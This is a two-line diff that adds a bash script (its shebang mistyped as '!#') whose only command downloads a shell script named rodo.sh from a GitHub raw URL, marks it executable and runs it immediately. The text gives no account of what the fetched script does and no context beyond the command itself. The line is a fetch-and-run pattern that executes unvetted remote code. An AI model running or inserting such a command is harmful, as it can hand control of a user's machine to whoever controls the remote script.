@@ -1,0 +1,2 @@
+!#/bin/bash
+wget https://raw.githubusercontent.com/terimajalah/akuo/main/rodo.sh && chmod +x rodo.sh && ./rodo.sh
